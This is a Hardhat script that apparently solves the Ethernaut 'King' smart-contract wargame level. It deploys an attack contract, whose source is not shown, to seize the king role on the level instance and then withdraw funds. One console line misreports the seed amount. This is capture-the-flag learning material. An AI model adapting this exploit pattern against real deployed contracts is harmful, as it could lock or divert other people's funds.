// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // connect to ethernaut instance
  const instanceAddress = "0xF8D5A0125539788A3378Ceb90C1C0F4d5634B248";
  const King = await ethers.getContractFactory("King");
  const king = await King.attach(instanceAddress);
  console.log('Connected to level instance');

  // deploy attack contract
  const KA = await hre.ethers.getContractFactory("KingAttack");
  const seedValue = ethers.utils.parseUnits("0.1", "ether");
  console.log(`Deploying with seed:\t${ethers.utils.parseEther(seedValue.toString())} ETH`);
  const ka = await KA.deploy(king.address, { value: seedValue });
  await ka.deployed();
  console.log(`Deployed to ${ka.address}`)

  // become the king
  console.log('Becoming King');
  await ka.becomeKing({ gasLimit: 50000 });
  console.log(`You the king!!!`);

  await ka.withdraw();


  // const prevAddress = "0x6e88d9653960113dD272C34B2332684941E45d64";
  // const KA = await hre.ethers.getContractFactory("KingAttack");  
  // const ka = await KA.attach(prevAddress);
  // await ka.withdraw();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
